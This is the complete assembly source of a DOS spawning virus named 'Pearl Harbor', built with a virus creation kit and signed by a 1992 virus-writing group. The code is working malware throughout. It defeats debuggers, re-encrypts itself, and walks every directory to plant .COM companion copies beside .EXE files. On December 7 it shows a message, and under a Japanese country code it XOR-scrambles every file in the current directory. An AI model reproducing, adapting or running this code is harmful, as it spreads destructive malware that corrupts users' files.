; PEARLHBR.ASM -- Pearl Harbor Virus
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Nowhere Man

virus_type	equ	2			; Spawning Virus
is_encrypted	equ	1			; We're encrypted
tsr_virus	equ	0			; We're not TSR

code		segment byte public
		assume	cs:code,ds:code,es:code,ss:code
		org	0100h

start		label	near

main		proc	near
		call	encrypt_decrypt		; Decrypt the virus

start_of_code	label	near

stop_tracing:	mov	cx,09EBh
		mov	ax,0FE05h		; Acutal move, plus a HaLT
		jmp	$-2
		add	ah,03Bh			; AH now equals 025h
		jmp	$-10			; Execute the HaLT
		mov	bx,offset null_vector	; BX points to new routine
		push	cs			; Transfer CS into ES
		pop	es			; using a PUSH/POP
		int	021h
		mov	al,1			; Disable interrupt 1, too
		int	021h
		jmp	short skip_null		; Hop over the loop
null_vector:	jmp	$			; An infinite loop
skip_null:	mov	byte ptr [lock_keys + 1],130  ; Prefetch unchanged
lock_keys:	mov	al,128			; Change here screws DEBUG
		out	021h,al			; If tracing then lock keyboard

		call	get_month
		cmp	ax,000Ch		; Did the function return 12?
		jne	skip00			; If not equal, skip effect
		call	get_day
		cmp	ax,0007h		; Did the function return 7?
		jne	skip00			; If not equal, skip effect
		jmp	short strt00		; Success -- skip jump
skip00:		jmp	end00			; Skip the routine
strt00:		mov	si,offset data00	; SI points to data
		mov	ah,0Eh			; BIOS display char. function
display_loop:   lodsb				; Load the next char. into AL
		or	al,al			; Is the character a null?
		je	disp_strnend		; If it is, exit
		int	010h			; BIOS video interrupt
		jmp	short display_loop	; Do the next character
disp_strnend:

end00:		call	get_country
		cmp	ax,0051h		; Did the function return 81?
		jne	skip01			; If not equal, skip effect
		call	get_month
		cmp	ax,000Ch		; Did the function return 12?
		jne	skip01			; If not equal, skip effect
		call	get_day
		cmp	ax,0007h		; Did the function return 7?
		jne	skip01			; If not equal, skip effect
		jmp	short strt01		; Success -- skip jump
skip01:		jmp	end01			; Skip the routine
strt01:		mov	dx,offset data01	; DX points to data
		push	bp			; Save BP
		mov	bp,sp			; BP points to stack frame
		sub	sp,4096			; Allocate 4096-byte buffer
		push	di			; Save DI
		mov	ah,02Fh			; DOS get DTA function
		int	021h
		mov	di,bx			; DI points to DTA
		mov	ah,04Eh			; DOS find first file function
		mov	cx,00100111b		; CX holds all file attributes
		int	021h
		jc      corrupt_end		; If no files found then exit
corrupt_file:	mov	ax,04301h		; DOS set file attributes function
		xor	cx,cx			; File will have no attributes
		lea	dx,[di + 01Eh]		; DX points to file name
		int	021h
		mov	ax,03D02h		; DOS open file function, r/w
		lea	dx,[di + 01Eh]		; DX points to file name
		int	021h
		xchg	bx,ax			; Transfer file handle to AX
c_crypt_loop:	mov	ah,03Fh			; DOS read from file function
		mov	cx,4096			; Read 4k of characters
		lea	dx,[bp - 4096]		; DX points to the buffer
		int	021h
		or	ax,ax			; Were 0 bytes read?
		je	close_c_file		; If so then close it up
		push	ax			; Save AX
		lea	si,[bp - 4096]		; SI points to the buffer
		xor	ah,ah			; BIOS get clock ticks function
		int	01Ah
		pop	cx			; CX holds number of bytes read
		push	cx			; Save CX
corrupt_bytes:	xor	byte ptr [si],dl	; XOR byte by clock ticks
		inc	si			; Do the next byte
		inc	dx			; Change the key for next byte
		loop	corrupt_bytes		; Repeat until buffer is done
		pop	dx			; Restore DX (holds bytes read)
		push	dx			; Save count for write
		mov	ax,04201h		; DOS file seek function, current
		mov	cx,0FFFFh		; Seeking backwards
		neg	dx			; Seeking backwards
		int	021h
		mov	ah,040h			; DOS write to file function
		pop	cx			; CX holds number of bytes read
		lea	dx,[bp - 4096]		; DX points to the buffer
		int	021h
		jmp	short c_crypt_loop
close_c_file:	mov	ax,05701h		; DOS set file date/time function
		mov	cx,[di + 016h]		; CX holds old file time
		mov	dx,[di + 018h]		; DX holds old file data
		int	021h
		mov	ah,03Eh			; DOS close file function
		int	021h
		mov	ax,04301h		; DOS set file attributes function
		xor	ch,ch			; Clear CH for attributes
		mov	cl,[di + 015h]		; CL holds old attributes
		lea	dx,[di + 01Eh]		; DX points to file name
		int	021h
		mov	ah,04Fh			; DOS find next file function
		int	021h
		jnc	corrupt_file		; If successful do next file
corrupt_end:	pop	di			; Restore DI
		mov	sp,bp			; Deallocate local buffer
		pop	bp			; Restore BP

end01:
		mov	ah,04Ah			; DOS resize memory function
		mov	bx,(finish - start) / 16 + 0272h  ; BX holds # of para.
		int	021h

		mov	sp,(finish - start) + 01100h  ; Change top of stack

		mov	si,offset spawn_name	; SI points to true filename
		int	02Eh			; DOS execution back-door
		push	ax			; Save return value for later

		mov	ax,cs			; AX holds code segment
		mov	ds,ax			; Restore data segment
		mov	es,ax			; Restore extra segment

		call	search_files		; Find and infect a file

		pop	ax			; AL holds return value
		mov	ah,04Ch			; DOS terminate function
		int	021h
main		endp


		db	010h,07Ch,0E5h,00Ch,0DAh

search_files	proc	near
		push	bp			; Save BP
		mov	bp,sp			; BP points to local buffer
		sub	sp,64			; Allocate 64 bytes on stack

		mov	ah,047h			; DOS get current dir function
		xor	dl,dl			; DL holds drive # (current)
		lea	si,[bp - 64]		; SI points to 64-byte buffer
		int	021h

		mov	ah,03Bh			; DOS change directory function
		mov	dx,offset root		; DX points to root directory
		int	021h

		call	traverse		; Start the traversal

		mov	ah,03Bh			; DOS change directory function
		lea	dx,[bp - 64]		; DX points to old directory
		int	021h

		mov	sp,bp			; Restore old stack pointer
		pop	bp			; Restore BP
		ret				; Return to caller

root		db	"\",0			; Root directory
search_files	endp

traverse	proc	near
		push	bp			; Save BP

		mov	ah,02Fh			; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		mov	ah,01Ah			; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh			; DOS find first function
		mov	cx,00010000b		; CX holds search attributes
		mov	dx,offset all_files	; DX points to "*.*"
		int	021h
		jc	leave_traverse		; Leave if no files present

check_dir:	cmp	byte ptr [bp - 107],16	; Is the file a directory?
		jne	another_dir		; If not, try again
		cmp	byte ptr [bp - 98],'.'	; Did we get a "." or ".."?
		je	another_dir		;If so, keep going

		mov	ah,03Bh			; DOS change directory function
		lea	dx,[bp - 98]		; DX points to new directory
		int	021h

		call	traverse		; Recursively call ourself

		pushf				; Save the flags
		mov	ah,03Bh			; DOS change directory function
		mov	dx,offset up_dir	; DX points to parent directory
		int	021h
		popf				; Restore the flags

		jnc	done_searching		; If we infected then exit

another_dir:	mov	ah,04Fh			; DOS find next function
		int	021h
		jnc	check_dir		; If found check the file

leave_traverse:
		mov	dx,offset exe_mask	; DX points to "*.EXE"
		call	find_files		; Try to infect a file
done_searching:	mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah			; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller

up_dir		db	"..",0			; Parent directory name
all_files	db	"*.*",0			; Directories to search for
exe_mask	db	"*.EXE",0		; Mask for all .EXE files
traverse	endp

		db	0D0h,0DCh,083h,09Eh,044h


find_files	proc	near
		push	bp			; Save BP

		mov	ah,02Fh			; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		push	dx			; Save file mask
		mov	ah,01Ah			; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh			; DOS find first file function
		mov	cx,00100111b		; CX holds all file attributes
		pop	dx			; Restore file mask
find_a_file:	int	021h
		jc	done_finding		; Exit if no files found
		call	infect_file		; Infect the file!
		jnc	done_finding		; Exit if no error
		mov	ah,04Fh			; DOS find next file function
		jmp	short find_a_file	; Try finding another file

done_finding:	mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah			; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller
find_files	endp

		db	07Eh,0FFh,09Ah,025h,02Bh

infect_file	proc	near
		mov	ah,02Fh			; DOS get DTA address function
		int	021h
		mov	di,bx			; DI points to the DTA

		lea	si,[di + 01Eh]		; SI points to file name
		mov	dx,si			; DX points to file name, too
		mov	di,offset spawn_name + 1; DI points to new name
		xor	ah,ah			; AH holds character count
transfer_loop:	lodsb				; Load a character
		or	al,al			; Is it a NULL?
		je	transfer_end		; If so then leave the loop
		inc	ah			; Add one to the character count
		stosb				; Save the byte in the buffer
		jmp	short transfer_loop	; Repeat the loop
transfer_end:	mov	byte ptr [spawn_name],ah; First byte holds char. count
		mov	byte ptr [di],13	; Make CR the final character

		mov	di,dx			; DI points to file name
		xor	ch,ch			;
		mov	cl,ah			; CX holds length of filename
		mov	al,'.'			; AL holds char. to search for
	repne	scasb				; Search for a dot in the name
		mov	word ptr [di],'OC'	; Store "CO" as first two bytes
		mov	byte ptr [di + 2],'M'	; Store "M" to make "COM"

		mov	byte ptr [set_carry],0	; Assume we'll fail
		mov	ax,03D00h		; DOS open file function, r/o
		int	021h
		jnc	infection_done		; File already exists, so leave
		mov	byte ptr [set_carry],1	; Success -- the file is OK

		mov	ah,03Ch			; DOS create file function
		mov	cx,00100111b		; CX holds file attributes (all)
		int	021h
		xchg	bx,ax			; BX holds file handle

		call	encrypt_code		; Write an encrypted copy

		mov	ah,03Eh			; DOS close file function
		int	021h

infection_done:	cmp	byte ptr [set_carry],1	; Set carry flag if failed
		ret				; Return to caller

spawn_name	db	12,12 dup (?),13	; Name for next spawn
set_carry	db	?			; Set-carry-on-exit flag
infect_file	endp


		db	038h,025h,0F2h,0EAh,074h

get_country     proc	near
		push	bp			; Save BP
		mov	bp,sp			; BP points to stack frame
		sub	sp,34			; Allocate 34 bytes on stack

		mov	ah,038h			; DOS get country function
		lea	dx,[bp - 34]		; DX points to unused buffer
		int	021h

		xchg	bx,ax			; AX holds the country code

		mov	sp,bp			; Deallocate local buffer
		pop	bp			; Restore BP
		ret				; Return to caller
get_country     endp

		db	05Bh,02Dh,0FBh,03Ah,0E9h

get_day         proc	near
		mov	ah,02Ah			; DOS get date function
		int	021h
		mov	al,dl			; Copy day into AL
		cbw				; Sign-extend AL into AX
		ret				; Return to caller
get_day         endp

		db	049h,053h,0C8h,006h,095h

get_month       proc	near
		mov	ah,02Ah			; DOS get date function
		int	021h
		mov	al,dh			; Copy month into AL
		cbw				; Sign-extend AL into AX
		ret				; Return to caller
get_month       endp

data00		db      "December 7th, 1941 -- A day that will live in infamy...",13,10,13,10
		db      07,07,07
		db      "*** REMEMBER PEARL HARBOR ***",13,10,0

data01		db      "C:\*.*",0

vcl_marker	db	"[VCL]",0		; VCL creation marker


note		db	"Dedicated to the memories of t"
		db	"he brave American men and wome"
		db	"n who gave their lives at [Pea"
		db	"rl Harbor].",0
		db	"Nowhere Man, [NuKE] '92",0

encrypt_code	proc	near
		mov	si,offset encrypt_decrypt; SI points to cipher routine

		xor	ah,ah			; BIOS get time function
		int	01Ah
		mov	word ptr [si + 8],dx	; Low word of timer is new key

		xor	byte ptr [si],1		;
		xor	byte ptr [si + 7],1	; Change all SIs to DIs
		xor	word ptr [si + 10],0101h; (and vice-versa)

		mov	di,offset finish	; Copy routine into heap
		mov	cx,finish - encrypt_decrypt - 1  ; All but final RET
		push	si			; Save SI for later
		push	cx			; Save CX for later
	rep	movsb				; Copy the bytes

		mov	si,offset write_stuff	; SI points to write stuff
		mov	cx,5			; CX holds length of write
	rep	movsb				; Copy the bytes

		pop	cx			; Restore CX
		pop	si			; Restore SI
		inc	cx			; Copy the RET also this time
	rep	movsb				; Copy the routine again

		mov	ah,040h			; DOS write to file function
		mov	dx,offset start		; DX points to virus

		call	finish			; Encrypt/write/decrypt

		ret				; Return to caller

write_stuff:	mov	cx,finish - start	; Length of code
		int	021h
encrypt_code	endp

end_of_code	label	near

encrypt_decrypt	proc	near
		mov	si,offset start_of_code ; SI points to code to decrypt
		mov	cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:	db	081h,034h,00h,00h	; XOR a word by the key
		inc	si			; Do the next word
		inc	si			;
		loop	xor_loop		; Loop until we're through
		ret				; Return to caller
encrypt_decrypt	endp
finish		label	near

code		ends
		end	main